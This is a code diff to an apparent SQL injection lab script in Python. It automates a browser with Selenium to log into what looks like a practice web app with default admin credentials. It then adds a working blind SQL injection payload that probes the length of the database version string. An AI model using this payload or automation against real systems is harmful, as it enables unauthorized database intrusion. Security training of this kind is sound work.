@@ -29,6 +29,17 @@ def sqlinjection(host):
     time.sleep(timeToSleep)
     login.click()
     
+    # Run this if db has not init
+    try:
+        create_db = driver.find_element("name", "create_db")
+        create_db.click()
+        time.sleep(timeToSleep+2)
+        username.send_keys("admin")
+        password.send_keys("password")
+        login=driver.find_element("name","Login")
+    except:
+        print("DB has been already initialized")   
+        
     # creating a log file 
     fp = open('sqloutput.log','w')
 
@@ -39,8 +50,7 @@ def sqlinjection(host):
     while not is_true:
         inputElement = driver.find_element("name","id")
         time.sleep(1)
-        # Send SQL attack query here
-        # inputElement.
+        inputElement.send_keys(f"1' and length(@@VERSION)={version_len}#")
         time.sleep(1)
         inputElement.send_keys(Keys.ENTER)
         time.sleep(1)
